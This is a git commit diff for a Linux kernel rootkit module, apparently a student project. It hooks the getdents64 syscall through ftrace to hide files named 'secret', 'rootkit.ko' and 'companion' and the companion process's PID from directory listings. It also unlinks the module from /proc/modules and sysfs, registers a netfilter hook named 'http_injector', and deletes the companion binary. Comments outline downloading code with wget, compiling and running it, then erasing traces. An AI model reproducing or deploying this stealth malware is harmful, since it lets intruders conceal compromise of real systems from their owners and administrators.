0295c097a2d2b38835b70b7b2eaca3efecff64f5
hanako <devsstudent777@gmail.com>
2024-12-13 13:15:22 +0100

    facto the code

--- src/main.c
+++ src/main.c
@@ -1,244 +1,85 @@
 #include "http_injector.h"
-#include "hide.h"
+#include "rootkit.h"
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Some studen of 2600, 1337");
+MODULE_DESCRIPTION("Tkt frere");
 
 int g_pid_companion = -1;
 
 asmlinkage long (*g_original_getdents)(const struct pt_regs *);
 
-static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
-    .name = "__x64_sys_getdents64",
-    .function = (myGetDents),
-    .original = (&g_original_getdents),
+t_ftrace_hook *g_f_hook[] = {&(t_ftrace_hook){
+	.name = "__x64_sys_getdents64",
+	.function = (myGetDents),
+	.original = (&g_original_getdents),
 }, NULL};
 
 static struct nf_hook_ops nfho = {
-      .hook        = http_nf_hookfn,
-      .hooknum     = NF_INET_LOCAL_OUT,
-      .pf          = PF_INET,
-      .priority    = NF_IP_PRI_FIRST
+	.hook		= http_nf_hookfn,
+	.hooknum	= NF_INET_LOCAL_OUT,
+	.pf			= PF_INET,
+	.priority	= NF_IP_PRI_FIRST
 };
 
-static struct delayed_work delayed_init_work;
-static struct workqueue_struct *delayed_init_wq;
-
-static bool is_system_ready(void)
-{
-    struct path p;
-
-    // Check if /sys is mounted
-    printk(KERN_INFO "Checking if /sys is mounted...\n");
-    if (kern_path("/sys", 0, &p) == 0) {
-        // Check if it's a directory (mount point)
-        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
-            path_put(&p); // Release the path reference
-            printk(KERN_INFO "/sys is mounted\n");
-        } else {
-            path_put(&p);
-            printk(KERN_INFO "/sys is not mounted properly\n");
-            return false;
-        }
-    } else {
-        printk(KERN_INFO "/sys is not available\n");
-        return false;
-    }
-
-    // Check if /proc is mounted
-    printk(KERN_INFO "Checking if /proc is mounted...\n");
-    if (kern_path("/proc", 0, &p) == 0) {
-        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
-            path_put(&p); // Release the path reference
-            printk(KERN_INFO "/proc is mounted\n");
-        } else {
-            path_put(&p);
-            printk(KERN_INFO "/proc is not mounted properly\n");
-            return false;
-        }
-    } else {
-        printk(KERN_INFO "/proc is not available\n");
-        return false;
-    }
-
-    // Check if /dev is mounted (i.e., the devtmpfs is ready)
-    printk(KERN_INFO "Checking if /dev is mounted...\n");
-    if (kern_path("/dev", 0, &p) == 0) {
-        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
-            path_put(&p); // Release the path reference
-            printk(KERN_INFO "/dev is mounted\n");
-        } else {
-            path_put(&p);
-            printk(KERN_INFO "/dev is not mounted properly\n");
-            return false;
-        }
-    } else {
-        printk(KERN_INFO "/dev is not available\n");
-        return false;
-    }
-
-    // If we reach here, critical filesystems are mounted, the system is ready for userland applications
-    printk(KERN_INFO "System is ready for userland tasks\n");
-
-    // You can now perform other checks or launch userland applications.
-    // For example, checking if the system is ready to compile or run applications.
-
-    return true;
-}
-
-// More precise checks for user login readiness
-static int is_user_login_possible(void)
-{
-    // Check display manager or login service status
-    struct path login_path;
-
-    // Check for display manager socket or service
-    if (kern_path("/run/systemd/sessions", 0, &login_path) == 0) {
-        path_put(&login_path);
-        return 1;
-    }
-
-    // Alternative: Check specific login services
-    // Like gdm (GNOME), lightdm, etc.
-    return 0;
-}
-
-static int wait_for_user_login(void)
-{
-    int timeout = 300; // 5 minute maximum wait
-
-    while (timeout > 0) {
-        // Check login services
-        if (is_user_login_possible()) {
-            printk(KERN_INFO "User login services are ready\\n");
-            return 0;
-        }
-
-        // Sleep between checks
-        msleep(1000); // 1-second intervals
-        timeout--;
-    }
-
-    printk(KERN_ERR "User login services did not become ready\\n");
-    return -ETIMEDOUT;
-}
-
-static void delayed_module_init_work(struct work_struct *work)
-{
-    // Check if system is ready
-    if (is_system_ready()) {
-        printk(KERN_INFO "System ready, performing delayed module initialization\\n");
-  compile_companion();
-  launch_companion();
-  get_pid_companion();
-  delete_binary();
-
-  // Protocol:
-
-  // Probably have to run a gcc .c
-  // We could host the .c on a github or any server
-  // So we would like download the .c, with a wget
-  // Then compile it gcc
-  // Then launch the companion
-  // Then remove all trace
-
-  // So it has to be obfuscate from ps : How do we get the PID ?
-  // It's possible to get the pid of a kernelModule with current->pid
-
-  // a mettre dans un fichier pour faire la logic
-
-    printk(KERN_INFO "pid %d\n", g_pid_companion);
-
-    if (fh_install_hook(f_hook[0])) {
-      printk(KERN_INFO "Bruh minstall hook eroor\n");
-    }
-
-
-        return;
-    }
-
-    // If not ready, requeue the work
-    queue_delayed_work(delayed_init_wq,
-                       &delayed_init_work,
-                       msecs_to_jiffies(5000)); // 5-second interval
-}
-
+struct delayed_work g_delayed_init_work;
+struct workqueue_struct *g_delayed_init_wq;
 
 
 static int __init rootkit_init(void) {
-  printk(KERN_INFO "%i\n", current->pid);
 
-  nfho.hooknum = NF_INET_PRE_ROUTING; 
-  nfho.priv = init_search_map();
+	/* Network Part */
+	nfho.hooknum = NF_INET_PRE_ROUTING; 
+	nfho.priv = init_search_map();
+	if (nfho.priv != NULL) {
+		fill_search_dict((search_map_t *)nfho.priv);
+		nf_register_net_hook(&init_net, &nfho);
+	}
 
-  if (nfho.priv != NULL) {
-    fill_search_dict((search_map_t *)nfho.priv);
-    nf_register_net_hook(&init_net, &nfho);
-  }
+	// Create a dedicated workqueue
+	g_delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
+	if (!g_delayed_init_wq) {
+		printk(KERN_ERR "Failed to create workqueue\\n");
+		return -ENOMEM;
+	}
 
-  // success = success && my_func(...)
-  printk(KERN_INFO "Rootkit has been loaded\n");
+	// Initialize delayed work
+	INIT_DELAYED_WORK(&g_delayed_init_work, delayed_module_init_work);
 
-  // Create a dedicated workqueue
-    delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
-    if (!delayed_init_wq) {
-        printk(KERN_ERR "Failed to create workqueue\\n");
-        return -ENOMEM;
-    }
+	// Queue initial work
+	queue_delayed_work(g_delayed_init_wq,
+		&g_delayed_init_work,
+		msecs_to_jiffies(1000)); // First check after 5 seconds
 
-    // Initialize delayed work
-    INIT_DELAYED_WORK(&delayed_init_work, delayed_module_init_work);
+	/* hide the module from /proc/modules */
+	list_del_init(&THIS_MODULE->list);
 
-    // Queue initial work
-    queue_delayed_work(delayed_init_wq,
-                       &delayed_init_work,
-                       msecs_to_jiffies(5000)); // First check after 5 seconds
+	/* hide the module from /sys/modules */
+	kobject_del(&THIS_MODULE->mkobj.kobj);
 
-    printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");
+	printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");
 
-//  wait_for_user_login();
-//  compile_companion();
-//  launch_companion();
-//  get_pid_companion();
-
-  // Protocol:
-
-  // Probably have to run a gcc .c
-  // We could host the .c on a github or any server
-  // So we would like download the .c, with a wget
-  // Then compile it gcc
-  // Then launch the companion
-  // Then remove all trace
-
-  // So it has to be obfuscate from ps : How do we get the PID ?
-  // It's possible to get the pid of a kernelModule with current->pid
-
-  // a mettre dans un fichier pour faire la logic
-
-//    printk(KERN_INFO "pid %d\n", g_pid_companion);
-
-//    if (fh_install_hook(f_hook[0])) {
-//      printk(KERN_INFO "Bruh minstall hook eroor\n");
- //   }
-
-    return 0;
+	return 0;
 }
 
 static void __exit rootkit_exit(void) {
-  search_map_t *map;
-  
-  if (nfho.priv != NULL) {
-    map = (search_map_t *)nfho.priv;
+	search_map_t *map;
+	
+	if (nfho.priv != NULL) {
+		map = (search_map_t *)nfho.priv;
 
-    free_search_map(map);
-    nf_unregister_net_hook(&init_net, &nfho);
-  }
-   if (delayed_init_wq) {
-        cancel_delayed_work_sync(&delayed_init_work);
-        destroy_workqueue(delayed_init_wq);
-    }
+		free_search_map(map);
+		nf_unregister_net_hook(&init_net, &nfho);
+	}
+	if (g_delayed_init_wq) {
+		cancel_delayed_work_sync(&g_delayed_init_work);
+		destroy_workqueue(g_delayed_init_wq);
+	}
 
-  fh_remove_hook(f_hook[0]);
-  printk(KERN_INFO "Rootkit has been unloaded\n");
+	fh_remove_hook(g_f_hook[0]);
+	printk(KERN_INFO "Rootkit has been unloaded\n");
 }
+
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
-MODULE_LICENSE("GPL");
---
+++ src/obfuscate.c
@@ -0,0 +1,167 @@
+#include "rootkit.h"
+
+void delete_binary(void) {
+	char *argv[] = {"/bin/rm", "/bin/companion", NULL};
+	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+	if (r >= 0) {
+		printk(KERN_INFO "Companion removed\n");
+	} else {
+		printk(KERN_INFO "Fail\n");
+	}
+}
+
+static int find_sys_call_addr(t_ftrace_hook *hook) {
+	hook->address = kallsyms_lookup_name(hook->name);
+	if (!hook->address) {
+		printk(KERN_ERR "Failed to find syscall table\n");
+		return 1;
+	}
+	*((unsigned long*) hook->original) = hook->address;
+	return 0;
+}
+
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
+{
+	t_ftrace_hook *hook = container_of(ops, t_ftrace_hook, ops);
+
+	if(!within_module(parent_ip, THIS_MODULE))
+		((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
+}
+
+int fh_install_hook(t_ftrace_hook *hook)
+{
+	int err;
+	err = find_sys_call_addr(hook);
+	if(err)
+		return err;
+	/* For many of function hooks (especially non-trivial ones), the $rip
+	 * register gets modified, so we have to alert ftrace to this fact. This
+	 * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
+	 * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
+	 * the built-in anti-recursion guard provided by ftrace is useless if
+	 * we're modifying $rip. This is why we have to implement our own checks
+	 * (see USE_FENTRY_OFFSET). */
+	hook->ops.func = fh_ftrace_thunk;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+			| FTRACE_OPS_FL_RECURSION
+			| FTRACE_OPS_FL_IPMODIFY;
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if(err)
+	{
+		printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+		return err;
+	}
+
+	err = register_ftrace_function(&hook->ops);
+	if(err)
+	{
+		printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
+		return err;
+	}
+
+	return 0;
+}
+
+void fh_remove_hook(t_ftrace_hook *hook)
+{
+	int err;
+	err = unregister_ftrace_function(&hook->ops);
+	if(err)
+	{
+		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+	}
+
+	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+	if(err) {
+		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+	}
+}
+
+static inline int is_digit(int c) {
+	return (c >= '0' && c <= '9');
+}
+
+
+static bool is_numeric(char *str) {
+	int i = 0;
+	while (str[i] && is_digit(str[i])) {
+		i++;
+	}
+	return (i == strlen(str));
+}
+
+bool is_current_file_to_hide(char *filename) {
+	char *string_to_hide[] = {"secret", "rootkit.ko", "companion", "companion.c", NULL};
+
+	int i = 0;
+	while (string_to_hide[i] != NULL) {
+		if (strstr(filename, string_to_hide[i]) != NULL) {
+			return true;
+		}
+		i++;
+	}
+	return false;
+}
+
+bool is_a_pid_to_hide(char *filename) {
+
+	int buff_pid = -1;
+
+	if (filename && is_numeric(filename)) {
+		buff_pid = (int)simple_strtol(filename, NULL, 10);
+
+		if (buff_pid == g_pid_companion) {
+			return (true);
+		}
+	}
+	return (false);
+}
+
+int loop_current_dirent (int size_dirent, struct linux_dirent64 __user *dirent) {
+
+	int pos_idx = 0;
+	int to_hide_bytes = 0;
+	void *dirent_original = (void *)dirent;
+	int ret_size = 0;
+
+	// Loop on all the files info, cutting information when necessary
+	while (pos_idx + to_hide_bytes < size_dirent) {
+		struct linux_dirent64 *dirent_buffer = (struct linux_dirent64 *)(dirent_original + pos_idx);
+		if (is_current_file_to_hide(dirent_buffer->d_name) || is_a_pid_to_hide(dirent_buffer->d_name)) {
+
+			void *current_pos = (void *)dirent_buffer + pos_idx;
+			void *next_pos = (void *)dirent_buffer + pos_idx + dirent_buffer->d_reclen;
+			int  unbrowsed_bytes = size_dirent - (pos_idx + dirent_buffer->d_reclen);
+
+			// Cutting current nodes
+			memcpy(current_pos, next_pos, unbrowsed_bytes);
+			to_hide_bytes += dirent_buffer->d_reclen;
+			continue ;
+		}
+		pos_idx += dirent_buffer->d_reclen;
+	}
+	ret_size = pos_idx;
+	return ret_size;
+}
+
+asmlinkage long myGetDents(const struct pt_regs *regs) {
+
+	struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
+	int getdent_ret = g_original_getdents(regs);
+	if (getdent_ret <= 0) 
+		return getdent_ret;
+
+	int ret = loop_current_dirent(getdent_ret, dirent);
+	/*
+	printf("%-10s ", (d_type == DT_REG) ?  "regular" :
+	(d_type == DT_DIR) ?  "directory" :
+	(d_type == DT_FIFO) ? "FIFO" :
+	(d_type == DT_SOCK) ? "socket" :
+	(d_type == DT_LNK) ?  "symlink" :
+	(d_type == DT_BLK) ?  "block dev" :
+	(d_type == DT_CHR) ?  "char dev" : "???");
+	*/
+	return ret;
+}
